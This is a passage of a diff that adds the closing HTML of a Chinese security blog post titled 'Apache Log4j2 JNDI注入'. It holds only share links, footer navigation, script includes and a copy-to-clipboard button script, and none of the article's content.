+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&is_video=false&description=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Apache Log4j2 JNDI注入&body=Check out this article: http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&title=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&name=Apache Log4j2 JNDI注入&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/12/13/Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5/&t=Apache Log4j2 JNDI注入" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Search?=Null
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
